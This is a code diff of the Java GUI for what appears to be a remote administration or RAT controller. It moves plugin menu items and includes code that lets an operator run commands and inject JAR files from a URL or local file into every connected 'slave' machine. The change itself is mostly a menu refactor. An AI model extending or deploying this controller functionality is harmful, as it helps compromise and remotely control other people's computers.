@@ -251,30 +251,6 @@ public class Frame extends BaseFrame {
 		JMenu mnServerModule = new JMenu("Stub Module");
 		mnServerModule.setIcon(new ImageIcon(Frame.class.getResource("/icons/bug.png")));
 		mnMain.add(mnServerModule);
-		
-		JMenu mnPlugins_1 = new JMenu("Plugins");
-		mnPlugins_1.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin.png")));
-		mnMain.add(mnPlugins_1);
-		
-				JMenuItem mntmPlugins = new JMenuItem("View Installed Plugins");
-				mnPlugins_1.add(mntmPlugins);
-				mntmPlugins.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						FramePlugins frame = new FramePlugins();
-						frame.setVisible(true);
-					}
-				});
-				mntmPlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin.png")));
-				
-				JMenuItem mntmPackPlugin = new JMenuItem("Pack Plugin");
-				mntmPackPlugin.addActionListener(new ActionListener() {
-					public void actionPerformed(ActionEvent arg0) {
-						new FramePackPlugin().setVisible(true);
-					}
-				});
-				mntmPackPlugin.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin_edit.png")));
-				mnPlugins_1.addSeparator();
-				mnPlugins_1.add(mntmPackPlugin);
 		mnMain.addSeparator();
 
 		JMenuItem mntmBuildServer = new JMenuItem("Normal Builder");
@@ -397,17 +373,6 @@ public class Frame extends BaseFrame {
 				System.exit(0);
 			}
 		});
-
-		JMenuItem mntmBrowsePlugins = new JMenuItem("View Available Plugins");
-		mntmBrowsePlugins.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				FrameInstallPlugins frame = new FrameInstallPlugins();
-				frame.setVisible(true);
-			}
-		});
-		mntmBrowsePlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/application_large.png")));
-		mnPlugins_1.add(mntmBrowsePlugins);
-		mntmBrowsePlugins.setEnabled(Main.isFeatureEnabled());
 
 		JMenuItem mntmUpdate = new JMenuItem("Update");
 		mntmUpdate.addActionListener(new ActionListener() {
@@ -761,6 +726,37 @@ public class Frame extends BaseFrame {
 
 		mnPlugins = new JMenu("Plugins");
 		menuBar.add(mnPlugins);
+
+		JMenuItem mntmPlugins = new JMenuItem("View Installed Plugins");
+		mnPlugins.add(mntmPlugins);
+		mntmPlugins.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				FramePlugins frame = new FramePlugins();
+				frame.setVisible(true);
+			}
+		});
+		mntmPlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin.png")));
+
+		JMenuItem mntmPackPlugin = new JMenuItem("Pack Plugin");
+		mnPlugins.add(mntmPackPlugin);
+		mntmPackPlugin.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				new FramePackPlugin().setVisible(true);
+			}
+		});
+		mntmPackPlugin.setIcon(new ImageIcon(Frame.class.getResource("/icons/plugin_edit.png")));
+		JMenuItem mntmBrowsePlugins = new JMenuItem("View Available Plugins");
+		mnPlugins.add(mntmBrowsePlugins);
+		mnPlugins.addSeparator();
+
+		mntmBrowsePlugins.addActionListener(new ActionListener() {
+			public void actionPerformed(ActionEvent arg0) {
+				FrameInstallPlugins frame = new FrameInstallPlugins();
+				frame.setVisible(true);
+			}
+		});
+		mntmBrowsePlugins.setIcon(new ImageIcon(Frame.class.getResource("/icons/application_large.png")));
+		mntmBrowsePlugins.setEnabled(Main.isFeatureEnabled());
 
 		JMenu mnOther = new JMenu("Other");
 		menuBar.add(mnOther);
@@ -1153,7 +1149,7 @@ public class Frame extends BaseFrame {
 				if (servers.size() > 0) {
 					JFileChooser f = new JFileChooser();
 					f.showOpenDialog(null);
-				
+
 					File file = f.getSelectedFile();
 
 					if (file == null) {
@@ -1182,7 +1178,7 @@ public class Frame extends BaseFrame {
 				if (servers.size() > 0) {
 					JFileChooser f = new JFileChooser();
 					f.showOpenDialog(null);
-				
+
 					File file = f.getSelectedFile();
 
 					if (file == null) {
@@ -1407,32 +1403,32 @@ public class Frame extends BaseFrame {
 		});
 		mntmRunCommand.setIcon(new ImageIcon(Frame.class.getResource("/icons/runcmd.png")));
 		popupMenu.add(mntmRunCommand);
-		
+
 		JMenu mnInject = new JMenu("Inject JAR");
 		mnInject.setIcon(new ImageIcon(Frame.class.getResource("/icons/inject.png")));
 		popupMenu.add(mnInject);
-		
+
 		JMenuItem mntmInjectFromUrl = new JMenuItem("Inject from URL");
 		mntmInjectFromUrl.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent arg0) {
 				List<Slave> servers = Utils.getSlaves();
 				if (servers.size() > 0) {
 					String url;
-					
+
 					url = Utils.showDialog("Inject from URL", "Type file URL");
-					
+
 					if (url == null || url != null && url.length() == 0) {
 						return;
 					}
-					
+
 					String mainClass;
-					
+
 					mainClass = Utils.showDialog("Inject from URL", "Type the JAR file entry point class name");
 
 					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
 						return;
 					}
-					
+
 					for (Slave slave : servers) {
 						slave.addToSendQueue(new Packet98InjectJAR(url, mainClass));
 					}
@@ -1441,7 +1437,7 @@ public class Frame extends BaseFrame {
 		});
 		mntmInjectFromUrl.setIcon(new ImageIcon(Frame.class.getResource("/icons/down_arrow.png")));
 		mnInject.add(mntmInjectFromUrl);
-		
+
 		JMenuItem mntmInjectFromFile = new JMenuItem("Inject from file");
 		mntmInjectFromFile.addActionListener(new ActionListener() {
 			public void actionPerformed(ActionEvent e) {
@@ -1449,21 +1445,21 @@ public class Frame extends BaseFrame {
 				if (servers.size() > 0) {
 					JFileChooser f = new JFileChooser();
 					f.showOpenDialog(null);
-				
+
 					File file = f.getSelectedFile();
 
 					if (file == null) {
 						return;
 					}
-					
+
 					String mainClass;
-					
+
 					mainClass = Utils.showDialog("Inject from File", "Type the JAR file entry point class name");
 
 					if (mainClass == null || mainClass != null && mainClass.length() == 0) {
 						return;
 					}
-					
+
 					for (Slave slave : servers) {
 						slave.addToSendQueue(new Packet98InjectJAR(file, mainClass));
 					}
@@ -1772,7 +1768,9 @@ public class Frame extends BaseFrame {
 	}
 
 	public void reloadPlugins() {
-		mnPlugins.removeAll();
+		while (mnPlugins.getComponentCount() >= 4) {
+			mnPlugins.remove(4);
+		}
 		if (PluginLoader.plugins.size() == 0) {
 			JMenuItem item = new JMenuItem("No plugins loaded");
 			item.setEnabled(false);
